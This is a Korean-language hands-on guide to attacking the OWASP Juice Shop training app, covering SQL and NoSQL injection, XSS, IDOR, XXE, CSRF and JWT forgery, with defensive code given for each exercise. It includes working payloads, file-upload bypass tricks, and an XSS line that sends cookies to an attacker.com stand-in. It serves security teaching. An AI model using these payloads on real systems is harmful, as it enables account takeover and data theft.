# OWASP Juice Shop 보안 취약점 실습 가이드

## 📚 목차
1. [소개](#소개)
2. [환경 설정](#환경-설정)
3. [실습 예제](#실습-예제)

---

## 소개

### OWASP Juice Shop이란?
OWASP Juice Shop은 의도적으로 취약하게 설계된 웹 애플리케이션으로, 실제 환경에서 발생할 수 있는 다양한 보안 취약점을 안전하게 학습할 수 있는 교육용 플랫폼입니다.

### 학습 목표
- 실제 웹 애플리케이션에서 발생하는 보안 취약점 이해
- OWASP Top 10 취약점 실습
- 공격 시나리오와 방어 기법 학습

---

## 환경 설정

### Docker를 이용한 설치
```bash
# Juice Shop 다운로드 및 실행
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# 브라우저에서 접속
# http://localhost:3000
```

### Node.js를 이용한 설치
```bash
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start
```

---

## 실습 예제

## 실습 1: SQL Injection (SQLi) - 로그인 우회

### 🎯 학습 목표
- SQL Injection 공격 원리 이해
- 인증 우회 기법 학습

### 📖 취약점 설명
SQL Injection은 사용자 입력값이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점입니다. 공격자는 특수한 SQL 구문을 삽입하여 데이터베이스를 조작할 수 있습니다.

### 🔍 실습 시나리오
관리자 계정으로 로그인을 시도하지만, 비밀번호를 모르는 상황입니다.

### 📝 실습 단계

**1단계: 로그인 페이지 접속**
- 우측 상단의 "Account" 메뉴 클릭
- "Login" 선택

**2단계: SQL Injection 페이로드 입력**
```
Email: admin@juice-sh.op'--
Password: (아무 값이나 입력)
```

**3단계: 공격 원리 이해**
```sql
-- 원래 쿼리
SELECT * FROM Users WHERE email='admin@juice-sh.op'--' AND password='...'

-- '--'는 SQL 주석으로, 뒤의 password 검증을 무효화합니다
```

### ✅ 성공 확인
- 관리자 계정으로 로그인 성공
- Score Board에 "Login Admin" 챌린지 해결 표시

### 🛡️ 방어 방법
```javascript
// 취약한 코드
const query = `SELECT * FROM Users WHERE email='${email}' AND password='${password}'`;

// 안전한 코드 (Prepared Statement 사용)
const query = 'SELECT * FROM Users WHERE email=? AND password=?';
db.execute(query, [email, password]);
```

---

## 실습 2: XSS (Cross-Site Scripting) - DOM 기반 XSS

### 🎯 학습 목표
- XSS 공격의 동작 원리 이해
- DOM 기반 XSS 취약점 실습

### 📖 취약점 설명
XSS는 공격자가 악의적인 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.

### 🔍 실습 시나리오
검색 기능을 통해 XSS 스크립트를 삽입합니다.

### 📝 실습 단계

**1단계: 검색창 찾기**
- 메인 페이지 상단의 검색창 확인

**2단계: XSS 페이로드 입력**
```html
<iframe src="javascript:alert('XSS')">
```

**3단계: 결과 확인**
- alert 창이 표시되면 XSS 공격 성공

**추가 페이로드 예시:**
```html
<img src=x onerror="alert('XSS')">
<script>alert('XSS')</script>
<svg onload="alert('XSS')">
```

### ✅ 성공 확인
- JavaScript alert 창 실행
- Score Board에서 "DOM XSS" 챌린지 해결

### 🛡️ 방어 방법
```javascript
// 취약한 코드
element.innerHTML = userInput;

// 안전한 코드 (입력값 이스케이프)
element.textContent = userInput;

// 또는 sanitization 라이브러리 사용
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

---

## 실습 3: Broken Access Control - 다른 사용자의 장바구니 접근

### 🎯 학습 목표
- 접근 제어 취약점 이해
- IDOR (Insecure Direct Object Reference) 공격 실습

### 📖 취약점 설명
접근 제어가 제대로 구현되지 않아 권한이 없는 사용자가 다른 사용자의 데이터에 접근할 수 있는 취약점입니다.

### 🔍 실습 시나리오
다른 사용자의 장바구니를 조회합니다.

### 📝 실습 단계

**1단계: 계정 생성 및 로그인**
- 일반 사용자 계정으로 로그인
- 장바구니에 상품 추가

**2단계: 브라우저 개발자 도구 열기**
- F12 키 누르기
- Network 탭 선택

**3단계: 장바구니 요청 확인**
```
GET /rest/basket/5 HTTP/1.1
```
- URL에서 숫자 "5"는 장바구니 ID입니다

**4단계: ID 변경하여 접근**
```
GET /rest/basket/1
GET /rest/basket/2
GET /rest/basket/3
```
- 브라우저 주소창에서 직접 URL 수정하여 접근

### ✅ 성공 확인
- 다른 사용자의 장바구니 내용 조회 성공
- Score Board에서 "View Basket" 챌린지 해결

### 🛡️ 방어 방법
```javascript
// 취약한 코드
app.get('/rest/basket/:id', (req, res) => {
  const basket = getBasket(req.params.id);
  res.json(basket);
});

// 안전한 코드 (권한 검증)
app.get('/rest/basket/:id', authenticateUser, (req, res) => {
  const basketId = req.params.id;
  const userId = req.user.id;
  
  if (!isOwner(userId, basketId)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const basket = getBasket(basketId);
  res.json(basket);
});
```

---

## 실습 4: Sensitive Data Exposure - 관리자 섹션 접근

### 🎯 학습 목표
- 민감한 정보 노출 취약점 이해
- 숨겨진 관리자 페이지 찾기

### 📖 취약점 설명
적절히 보호되지 않은 민감한 데이터나 관리 기능이 노출되어 있는 취약점입니다.

### 🔍 실습 시나리오
관리자 전용 페이지를 찾아 접근합니다.

### 📝 실습 단계

**1단계: robots.txt 확인**
```
브라우저에서 접속: http://localhost:3000/robots.txt
```

**2단계: 파일 내용 분석**
```
User-agent: *
Disallow: /ftp
```

**3단계: FTP 디렉토리 접근**
```
http://localhost:3000/ftp
```

**4단계: 민감한 파일 확인**
- acquisitions.md
- coupons_2013.md.bak
- package.json.bak

**5단계: 파일 다운로드**
- 각 파일을 클릭하여 내용 확인

### ✅ 성공 확인
- FTP 디렉토리 접근 성공
- 백업 파일 및 민감한 정보 확인
- Score Board에서 "Access the FTP" 챌린지 해결

### 🛡️ 방어 방법
```javascript
// 디렉토리 리스팅 비활성화
app.use('/ftp', express.static('ftp', { 
  dotfiles: 'deny',
  index: false  // 디렉토리 리스팅 방지
}));

// 또는 접근 제어
app.use('/ftp', authenticateAdmin, express.static('ftp'));
```

---

## 실습 5: Security Misconfiguration - 에러 메시지를 통한 정보 수집

### 🎯 학습 목표
- 보안 설정 오류 이해
- 에러 메시지를 통한 정보 수집 기법

### 📖 취약점 설명
상세한 에러 메시지가 사용자에게 노출되어 시스템 정보를 유출하는 취약점입니다.

### 🔍 실습 시나리오
의도적으로 에러를 발생시켜 시스템 정보를 수집합니다.

### 📝 실습 단계

**1단계: API 엔드포인트 테스트**
```
http://localhost:3000/rest/products/search?q=
```

**2단계: 잘못된 형식의 요청 전송**
- 개발자 도구의 Console에서 실행:
```javascript
fetch('/api/Users/undefined')
  .then(r => r.json())
  .then(console.log);
```

**3단계: 에러 메시지 분석**
```json
{
  "error": "SQLITE_ERROR: no such column: undefined",
  "stack": "Error: SQLITE_ERROR...",
  "query": "SELECT * FROM Users WHERE id = undefined"
}
```

**4단계: 수집된 정보**
- 데이터베이스: SQLite 사용
- 테이블 구조: Users 테이블 존재
- SQL 쿼리 구조 노출

### ✅ 성공 확인
- 상세 에러 메시지 확인
- 시스템 정보 수집 성공

### 🛡️ 방어 방법
```javascript
// 취약한 코드 (프로덕션 환경)
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: err.sql
  });
});

// 안전한 코드
app.use((err, req, res, next) => {
  // 로그는 서버에만 기록
  logger.error(err);
  
  // 사용자에게는 일반적인 메시지만 표시
  res.status(500).json({
    error: 'Internal Server Error'
  });
});
```

---

## 실습 6: Broken Authentication - 비밀번호 재설정 우회

### 🎯 학습 목표
- 인증 메커니즘의 취약점 이해
- 보안 질문 우회 기법

### 📖 취약점 설명
취약한 비밀번호 재설정 프로세스를 악용하여 다른 사용자의 계정에 접근하는 공격입니다.

### 🔍 실습 시나리오
Jim의 계정 비밀번호를 재설정합니다.

### 📝 실습 단계

**1단계: 비밀번호 찾기 페이지 접속**
- 로그인 페이지에서 "Forgot your password?" 클릭

**2단계: Jim의 이메일 입력**
```
Email: jim@juice-sh.op
```

**3단계: 보안 질문 확인**
```
"Your eldest siblings middle name?"
```

**4단계: 정보 수집**
- 구글 검색: "jim juice shop brother"
- 또는 추측 가능한 일반적인 이름 시도

**5단계: 답변 입력**
```
Answer: Samuel
(또는 다양한 이름 시도)
```

**6단계: 새 비밀번호 설정**
- 새로운 비밀번호 입력 및 확인

### ✅ 성공 확인
- Jim 계정의 비밀번호 재설정 성공
- 새 비밀번호로 로그인 가능

### 🛡️ 방어 방법
```javascript
// 안전한 비밀번호 재설정 프로세스
// 1. 이메일 인증 사용
app.post('/reset-password', async (req, res) => {
  const { email } = req.body;
  const token = generateSecureToken();
  
  await saveResetToken(email, token, expiresIn30Minutes);
  await sendEmail(email, `Reset link: /reset/${token}`);
  
  res.json({ message: 'Check your email' });
});

// 2. 토큰 검증
app.post('/reset/:token', async (req, res) => {
  const { token } = req.params;
  const { newPassword } = req.body;
  
  if (!isValidToken(token)) {
    return res.status(400).json({ error: 'Invalid or expired token' });
  }
  
  await updatePassword(token, newPassword);
  await invalidateToken(token);
  
  res.json({ message: 'Password updated' });
});
```

---

## 실습 7: XXE (XML External Entity) Injection

### 🎯 학습 목표
- XXE 공격 원리 이해
- XML 파서의 취약점 악용

### 📖 취약점 설명
XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점으로, 시스템 파일을 읽거나 SSRF 공격을 수행할 수 있습니다.

### 🔍 실습 시나리오
파일 업로드 기능을 통해 XXE 공격을 수행합니다.

### 📝 실습 단계

**1단계: Complaint 페이지 접속**
- Customer Feedback 메뉴 선택
- 파일 업로드 기능 확인

**2단계: 악의적인 XML 파일 생성**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feedback>
  <comment>&xxe;</comment>
  <rating>5</rating>
</feedback>
```

**3단계: 파일 업로드**
- 생성한 XML 파일을 complaint.xml로 저장
- 파일 업로드

**4단계: 결과 확인**
- 개발자 도구의 Network 탭에서 응답 확인
- /etc/passwd 내용이 포함된 응답 확인

**Windows 환경 페이로드:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### ✅ 성공 확인
- 시스템 파일 내용 읽기 성공
- Score Board에서 XXE 챌린지 해결

### 🛡️ 방어 방법
```javascript
// 취약한 코드
const libxmljs = require('libxmljs');
const xmlDoc = libxmljs.parseXml(xmlString);

// 안전한 코드 (외부 엔티티 비활성화)
const libxmljs = require('libxmljs');
const xmlDoc = libxmljs.parseXml(xmlString, { 
  noent: false,  // 엔티티 확장 비활성화
  dtdload: false,  // DTD 로딩 비활성화
  dtdvalid: false  // DTD 검증 비활성화
});

// 또는 JSON 사용 권장
```

---

## 실습 8: CSRF (Cross-Site Request Forgery)

### 🎯 학습 목표
- CSRF 공격 원리 이해
- 토큰 없는 요청의 위험성 학습

### 📖 취약점 설명
사용자가 의도하지 않은 요청을 공격자가 강제로 실행시키는 공격입니다.

### 🔍 실습 시나리오
로그인한 사용자의 권한으로 상품평을 작성합니다.

### 📝 실습 단계

**1단계: 로그인 및 상품평 작성**
- 일반 사용자로 로그인
- 상품 상세 페이지에서 "Reviews" 확인

**2단계: 정상 요청 분석**
- F12 개발자 도구 열기
- Network 탭에서 상품평 작성 요청 확인
```
POST /api/feedbacks
Content-Type: application/json

{
  "comment": "Great product!",
  "rating": 5,
  "captcha": "8",
  "captchaId": "1"
}
```

**3단계: CSRF 공격 HTML 생성**
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Free Gift!</h1>
  <form id="csrf-form" action="http://localhost:3000/api/feedbacks" method="POST">
    <input type="hidden" name="comment" value="Hacked!">
    <input type="hidden" name="rating" value="1">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

**4단계: 공격 시뮬레이션**
- HTML 파일을 저장하고 열기
- 로그인한 상태에서 파일 실행

### ✅ 성공 확인
- 의도하지 않은 상품평 작성 성공
- CSRF 공격 이해

### 🛡️ 방어 방법
```javascript
// CSRF 토큰 구현
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// 폼 렌더링 시 토큰 포함
app.get('/feedback', csrfProtection, (req, res) => {
  res.render('feedback', { csrfToken: req.csrfToken() });
});

// 요청 검증
app.post('/api/feedbacks', csrfProtection, (req, res) => {
  // CSRF 토큰이 유효한 경우에만 처리
  // ...
});
```

---

## 실습 9: Security Through Obscurity - 숨겨진 Score Board 찾기

### 🎯 학습 목표
- 숨김을 통한 보안의 한계 이해
- 클라이언트 측 코드 분석 기법

### 📖 취약점 설명
보안 기능을 숨기는 것만으로는 충분한 보안을 제공할 수 없습니다.

### 🔍 실습 시나리오
숨겨진 Score Board 페이지를 찾습니다.

### 📝 실습 단계

**1단계: 소스 코드 검사**
- F12 개발자 도구 열기
- Sources 탭 선택

**2단계: JavaScript 파일 분석**
- main.js 또는 app.js 파일 열기
- "score" 키워드로 검색

**3단계: 라우팅 정보 찾기**
```javascript
{
  path: 'score-board',
  component: ScoreBoardComponent
}
```

**4단계: Score Board 접근**
```
http://localhost:3000/#/score-board
```

**대체 방법: Network 탭 활용**
- Network 탭에서 XHR 요청 확인
- API 엔드포인트 분석
```
GET /api/challenges
```

### ✅ 성공 확인
- Score Board 페이지 접근 성공
- 모든 챌린지 목록 확인
- 첫 번째 챌린지 해결!

### 🛡️ 방어 방법
```javascript
// 중요: 숨김이 아닌 실제 접근 제어 구현
app.get('/score-board', authenticateUser, authorizeAdmin, (req, res) => {
  // 관리자만 접근 가능
  res.render('score-board');
});

// 클라이언트 측 라우팅에도 가드 추가
const routes = [
  {
    path: 'score-board',
    component: ScoreBoardComponent,
    canActivate: [AdminGuard]  // 권한 검증
  }
];
```

---

## 실습 10: Injection - NoSQL Injection

### 🎯 학습 목표
- NoSQL Injection 공격 이해
- MongoDB 쿼리 조작 기법

### 📖 취약점 설명
NoSQL 데이터베이스에서도 입력값 검증이 부족하면 인젝션 공격이 가능합니다.

### 🔍 실습 시나리오
로그인 시 NoSQL 쿼리를 조작하여 인증을 우회합니다.

### 📝 실습 단계

**1단계: Burp Suite 또는 브라우저 개발자 도구 준비**
- F12 개발자 도구 열기
- Network 탭 선택

**2단계: 로그인 요청 인터셉트**
- 로그인 시도
- POST 요청 확인
```json
{
  "email": "test@test.com",
  "password": "test123"
}
```

**3단계: NoSQL Injection 페이로드 수정**
- Console 탭에서 직접 요청 전송
```javascript
fetch('/rest/user/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    email: {"$ne": ""},
    password: {"$ne": ""}
  })
})
.then(r => r.json())
.then(console.log);
```

**4단계: 페이로드 설명**
```javascript
// $ne는 MongoDB의 "not equal" 연산자
// 빈 문자열이 아닌 모든 사용자 매칭
{
  email: {"$ne": ""},     // email != ""
  password: {"$ne": ""}   // password != ""
}
```

**대체 페이로드:**
```javascript
{
  email: {"$gt": ""},     // email > ""
  password: {"$gt": ""}   // password > ""
}
```

### ✅ 성공 확인
- 로그인 성공 (첫 번째 사용자 계정으로)
- JWT 토큰 발급 확인

### 🛡️ 방어 방법
```javascript
// 취약한 코드
app.post('/rest/user/login', (req, res) => {
  const { email, password } = req.body;
  User.findOne({ email: email, password: password })
    .then(user => res.json(user));
});

// 안전한 코드 (입력값 타입 검증)
app.post('/rest/user/login', (req, res) => {
  const { email, password } = req.body;
  
  // 문자열 타입만 허용
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  // Prepared Statement와 유사한 방식
  User.findOne()
    .where('email').equals(email)
    .where('password').equals(hashPassword(password))
    .then(user => {
      if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      res.json(user);
    });
});

// 또는 mongoose-sanitize 사용
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
```

---

## 📊 실습 체크리스트

| 번호 | 취약점 | 난이도 | 완료 |
|------|--------|--------|------|
| 1 | SQL Injection | ⭐⭐ | ☐ |
| 2 | XSS | ⭐⭐ | ☐ |
| 3 | Broken Access Control | ⭐⭐⭐ | ☐ |
| 4 | Sensitive Data Exposure | ⭐ | ☐ |
| 5 | Security Misconfiguration | ⭐⭐ | ☐ |
| 6 | Broken Authentication | ⭐⭐⭐ | ☐ |
| 7 | XXE Injection | ⭐⭐⭐⭐ | ☐ |
| 8 | CSRF | ⭐⭐⭐ | ☐ |
| 9 | Security Through Obscurity | ⭐ | ☐ |
| 10 | NoSQL Injection | ⭐⭐⭐⭐ | ☐ |

---

## 🎓 추가 학습 리소스

### 권장 학습 순서
1. 실습 9 (Score Board 찾기) - 워밍업
2. 실습 4 (FTP 접근) - 기초
3. 실습 1 (SQL Injection) - 핵심
4. 실습 2 (XSS) - 핵심
5. 실습 3, 5, 6, 8 - 중급
6. 실습 7, 10 - 고급

### 유용한 도구
- **Burp Suite Community**: HTTP 프록시 및 요청 조작
- **OWASP ZAP**: 자동화된 취약점 스캐닝
- **Postman**: API 테스팅
- **Browser DevTools**: 네트워크 분석 및 디버깅

### 참고 자료
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Juice Shop 공식 가이드: https://pwning.owasp-juice.shop/
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

## ⚠️ 중요 공지사항

### 법적 고지
- **절대 실제 시스템에 대해 무단으로 보안 테스트를 수행하지 마십시오**
- 이 실습은 교육 목적으로만 사용되어야 합니다
- 학습한 기술을 불법적인 용도로 사용할 경우 법적 책임을 질 수 있습니다

### 윤리적 해킹 원칙
1. **허가**: 항상 명시적인 허가를 받고 테스트
2. **범위**: 테스트 범위를 명확히 정의
3. **기밀유지**: 발견한 취약점을 책임감 있게 보고
4. **무해성**: 시스템이나 데이터에 손상을 주지 않음
5. **학습**: 지속적인 학습과 기술 향상

---

## 🔧 고급 실습 팁

### Burp Suite 활용법

**1. Proxy 설정**
```
1. Burp Suite 실행
2. Proxy > Options
3. Proxy Listeners: 127.0.0.1:8080
4. 브라우저 프록시 설정: localhost:8080
```

**2. Intercept 사용**
```
1. Proxy > Intercept > Intercept is on
2. 브라우저에서 요청 전송
3. Burp에서 요청 수정
4. Forward 버튼 클릭
```

**3. Repeater 활용**
```
1. 요청 우클릭 > Send to Repeater
2. Repeater 탭에서 요청 수정
3. Send 버튼으로 반복 테스트
```

### 브라우저 개발자 도구 활용

**Network 탭 필터링**
```javascript
// XHR 요청만 보기
필터: XHR

// 특정 도메인 필터
필터: domain:localhost

// 상태 코드로 필터
필터: status-code:200
```

**Console에서 쿠키 확인**
```javascript
// 모든 쿠키 확인
document.cookie

// 특정 쿠키 읽기
document.cookie.split(';').find(c => c.includes('token'))

// localStorage 확인
localStorage.getItem('token')
```

---

## 📝 실전 시나리오별 연습 문제

### 시나리오 1: 전체 공격 체인 구성
**목표**: SQL Injection → 관리자 접근 → 데이터 탈취

**단계**:
1. SQL Injection으로 관리자 로그인
2. 관리자 페이지에서 모든 사용자 정보 확인
3. API를 통해 주문 내역 조회
4. 민감한 정보 수집

**힌트**:
```
GET /rest/user/authentication-details
GET /api/Users
GET /api/orders
```

### 시나리오 2: 파일 업로드 취약점 체인
**목표**: XXE → 파일 읽기 → 추가 정보 수집

**단계**:
1. XXE를 통해 /etc/passwd 읽기
2. 사용자 목록에서 계정 정보 수집
3. 다른 설정 파일 읽기 시도
4. 애플리케이션 소스 코드 경로 추측

**추가 페이로드**:
```xml
<!-- 파일 리스팅 시도 (일부 환경) -->
<!ENTITY xxe SYSTEM "file:///">

<!-- PHP 래퍼 (PHP 환경) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### 시나리오 3: 권한 상승
**목표**: 일반 사용자 → 관리자 권한 획득

**단계**:
1. 일반 계정 생성 및 로그인
2. JWT 토큰 분석
3. 토큰 조작 시도
4. 관리자 권한 획득

**JWT 토큰 분석**:
```javascript
// JWT 디코딩
const token = localStorage.getItem('token');
const payload = JSON.parse(atob(token.split('.')[1]));
console.log(payload);

// 출력 예시:
// {
//   "email": "user@juice-sh.op",
//   "role": "customer",
//   "iat": 1234567890
// }
```

---

## 🛠️ 문제 해결 가이드

### 일반적인 문제와 해결책

**문제 1: Docker 컨테이너가 시작되지 않음**
```bash
# 포트 충돌 확인
netstat -ano | findstr :3000  # Windows
lsof -i :3000  # Linux/Mac

# 다른 포트 사용
docker run -d -p 4000:3000 bkimminich/juice-shop
```

**문제 2: 챌린지가 해결되지 않음**
```
해결책:
1. Score Board에서 힌트 확인
2. 브라우저 캐시 삭제 (Ctrl + Shift + Delete)
3. 새로운 시크릿 창에서 시도
4. 로그아웃 후 다시 시도
```

**문제 3: API 요청이 실패함**
```javascript
// CORS 에러 확인
// 브라우저 개발자 도구 Console 확인

// 해결: 같은 도메인에서 요청
// localhost:3000에서만 테스트
```

**문제 4: SQL Injection이 작동하지 않음**
```sql
-- 다양한 페이로드 시도
admin'--
admin' OR '1'='1
admin' OR 1=1--
' OR '1'='1
admin@juice-sh.op'--
```

---

## 📚 심화 학습 주제

### 1. SQL Injection 심화

**Union-based SQL Injection**
```sql
' UNION SELECT null, username, password FROM Users--
' UNION SELECT 1,2,3,4,5--
```

**Blind SQL Injection**
```sql
-- Boolean-based
' AND '1'='1
' AND '1'='2

-- Time-based
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
```

### 2. XSS 심화

**Stored XSS 찾기**
```
목표: 데이터베이스에 스크립트 저장
위치: 
- 사용자 프로필
- 상품평
- 피드백 양식
```

**XSS를 이용한 쿠키 탈취**
```javascript
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

### 3. 인증/인가 심화

**JWT 토큰 분석 및 조작**
```javascript
// 1. 토큰 구조 이해
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";

// 2. 각 부분 디코딩
const [header, payload, signature] = token.split('.');
console.log(JSON.parse(atob(header)));
console.log(JSON.parse(atob(payload)));

// 3. None 알고리즘 시도
const fakeHeader = btoa(JSON.stringify({
  "alg": "none",
  "typ": "JWT"
}));
const fakePayload = btoa(JSON.stringify({
  "email": "admin@juice-sh.op",
  "role": "admin"
}));
const fakeToken = fakeHeader + "." + fakePayload + ".";
```

### 4. File Upload 취약점

**악의적인 파일 업로드**
```javascript
// 1. 파일 확장자 우회
image.php.jpg
image.jpg.php
image.php%00.jpg

// 2. MIME 타입 조작
Content-Type: image/jpeg
(실제로는 PHP 파일)

// 3. SVG를 이용한 XSS
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>
```

---

## 🎯 실전 연습 과제

### 과제 1: 완전한 공격 시나리오 작성
**요구사항**:
1. 정찰 (Reconnaissance)
2. 취약점 식별
3. 공격 실행
4. 권한 유지
5. 흔적 제거

**제출물**:
- 단계별 스크린샷
- 사용한 도구와 명령어
- 발견한 취약점 리스트
- 보안 개선 제안서

### 과제 2: 취약점 보고서 작성
**템플릿**:
```markdown
# 취약점 보고서

## 1. 요약
- 취약점 이름:
- 심각도: (Critical/High/Medium/Low)
- CVSS 점수:

## 2. 상세 설명
- 취약점 위치:
- 공격 방법:
- 영향:

## 3. 재현 단계
1. 
2. 
3. 

## 4. 개념 증명 (PoC)
```code here```

## 5. 영향 분석
- 기밀성:
- 무결성:
- 가용성:

## 6. 권장 사항
- 단기 해결책:
- 장기 해결책:
- 참고 자료:
```

### 과제 3: 자동화 스크립트 작성
**목표**: Python으로 취약점 스캐너 작성

```python
import requests
import json

class JuiceShopScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_sql_injection(self):
        """SQL Injection 테스트"""
        payloads = [
            "admin'--",
            "' OR '1'='1",
            "' OR 1=1--"
        ]
        
        for payload in payloads:
            data = {
                "email": payload,
                "password": "test"
            }
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json=data
            )
            
            if response.status_code == 200:
                print(f"[+] SQL Injection 성공: {payload}")
                return True
        
        return False
    
    def test_xss(self):
        """XSS 테스트"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>"
        ]
        
        for payload in payloads:
            response = self.session.get(
                f"{self.base_url}/rest/products/search",
                params={"q": payload}
            )
            
            if payload in response.text:
                print(f"[+] XSS 취약점 발견: {payload}")
                return True
        
        return False
    
    def run_all_tests(self):
        """모든 테스트 실행"""
        print("[*] 취약점 스캔 시작...")
        print("[*] SQL Injection 테스트...")
        self.test_sql_injection()
        print("[*] XSS 테스트...")
        self.test_xss()
        print("[*] 스캔 완료!")

# 사용 예시
if __name__ == "__main__":
    scanner = JuiceShopScanner("http://localhost:3000")
    scanner.run_all_tests()
```

---

## 🌟 보너스 챌린지

### 숨겨진 챌린지 찾기

**힌트 1**: Easter Egg 찾기
```
위치: 사진 파일의 메타데이터
도구: exiftool 사용
```

**힌트 2**: 개발자 백도어
```
특정 엔드포인트에 숨겨진 개발자 기능
힌트: /debug, /admin, /test
```

**힌트 3**: 타이밍 공격
```
비밀번호 검증 시간 차이 분석
도구: Python의 time 모듈
```

---

## 📖 용어 사전

**SQL Injection (SQLi)**: SQL 쿼리를 조작하여 데이터베이스를 공격하는 기법

**Cross-Site Scripting (XSS)**: 악의적인 스크립트를 웹 페이지에 삽입하는 공격

**Cross-Site Request Forgery (CSRF)**: 사용자의 권한을 도용하여 의도하지 않은 요청을 실행

**XML External Entity (XXE)**: XML 파서의 취약점을 이용한 공격

**Insecure Direct Object Reference (IDOR)**: 직접 객체 참조의 취약점

**JWT (JSON Web Token)**: JSON 기반의 토큰 인증 방식

**OWASP**: Open Web Application Security Project

**Burp Suite**: 웹 애플리케이션 보안 테스팅 도구

**Payload**: 공격에 사용되는 악의적인 입력값

**PoC (Proof of Concept)**: 취약점 존재를 증명하는 코드

---

## 🔍 추가 실습 아이디어

### 1. 레이스 컨디션 (Race Condition)
```javascript
// 동시에 여러 요청 전송
Promise.all([
  fetch('/api/basket/1/checkout'),
  fetch('/api/basket/1/checkout'),
  fetch('/api/basket/1/checkout')
]);
```

### 2. 파라미터 오염 (Parameter Pollution)
```
GET /api/products?id=1&id=2&id=3
POST body: email=user1@test.com&email=admin@juice-sh.op
```

### 3. HTTP 헤더 인젝션
```
X-Forwarded-For: 127.0.0.1
User-Agent: <script>alert('XSS')</script>
Referer: javascript:alert(1)
```

### 4. 비즈니스 로직 우회
```
목표: 
- 쿠폰 중복 사용
- 음수 수량 주문
- 가격 조작
```

---

## 📞 도움말 및 지원

### 문제가 있을 때
1. **Score Board 확인**: 힌트와 난이도 확인
2. **공식 문서**: https://pwning.owasp-juice.shop
3. **커뮤니티**: OWASP Slack, Reddit r/netsec
4. **GitHub Issues**: 버그 리포트 및 질문

### 추천 학습 경로
```
초급 (1-2주)
└─ 실습 1, 2, 4, 9

중급 (2-3주)
└─ 실습 3, 5, 6, 8

고급 (3-4주)
└─ 실습 7, 10 + 추가 챌린지

전문가 (지속적)
└─ Bug Bounty, CTF 참가
```

---

## 🎓 수료 기준

### Bronze Level (기초)
- [ ] 10개 기본 실습 완료
- [ ] 취약점 보고서 1개 작성
- [ ] Score Board 20% 달성

### Silver Level (중급)
- [ ] 모든 기본 실습 완료
- [ ] 추가 챌린지 5개 해결
- [ ] 자동화 스크립트 작성
- [ ] Score Board 50% 달성

### Gold Level (고급)
- [ ] Score Board 80% 이상
- [ ] 전체 공격 시나리오 구성
- [ ] 보안 개선 제안서 작성
- [ ] CTF 또는 Bug Bounty 경험

### Platinum Level (전문가)
- [ ] Score Board 100% 달성
- [ ] 커스텀 익스플로잇 개발
- [ ] 보안 도구 제작
- [ ] 커뮤니티 기여

---

## 🏆 마무리

이 가이드를 통해 웹 애플리케이션 보안의 기초부터 고급 기법까지 학습하셨습니다. 

**기억하세요**:
- 보안은 지속적인 학습이 필요합니다
- 윤리적 해킹 원칙을 항상 준수하세요
- 발견한 취약점은 책임감 있게 보고하세요
- 실제 시스템에는 절대 무단으로 테스트하지 마세요

**다음 단계**:
1. HackTheBox, TryHackMe 등 플랫폼에서 추가 실습
2. Bug Bounty 프로그램 참여 (HackerOne, Bugcrowd)
3. CTF 대회 참가
4. 보안 자격증 취득 (CEH, OSCP 등)

**Happy Hacking! 🚀**

---

**문서 버전**: 1.0  
**최종 업데이트**: 2025년 11월  
**작성자**: OWASP Juice Shop 교육팀  
**라이선스**: MIT License